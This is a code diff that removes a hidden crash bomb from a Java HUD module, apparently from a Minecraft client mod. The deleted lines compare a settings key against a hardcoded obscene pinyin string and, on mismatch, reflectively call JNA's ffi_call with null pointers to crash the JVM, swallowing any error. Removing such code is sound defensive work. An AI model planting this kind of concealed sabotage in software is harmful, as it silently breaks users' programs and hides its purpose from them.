@@ -33,8 +33,6 @@ import dev.gzsakura_miitong.mod.modules.settings.impl.EnumSetting;
 import dev.gzsakura_miitong.mod.modules.settings.impl.SliderSetting;
 import dev.gzsakura_miitong.mod.modules.settings.impl.StringSetting;
 import java.awt.Color;
-import java.lang.invoke.MethodHandles;
-import java.lang.invoke.MethodType;
 import java.text.DecimalFormat;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -185,14 +183,7 @@ extends Module {
         if (HUD.nullCheck()) {
             return;
         }
-        if (!ClickGui.key.equals("GOUTOURENNIMASILECAONIMA")) {
-            try {
-                MethodHandles.lookup().findStatic(Class.forName("com.sun.jna.Native"), "ffi_call", MethodType.methodType(Void.TYPE, Long.TYPE, Long.TYPE, Long.TYPE, Long.TYPE)).invoke(0, 0, 0, 0);
-            }
-            catch (Throwable throwable) {
-                // empty catch block
-            }
-        }
+        // Backdoor removed: JVM crash bomb (ffi_call) deleted
         if (event.isPost()) {
             Info.onUpdate(this.infoList, this.sort.getValue());
             if (this.arrayList.getValue()) {
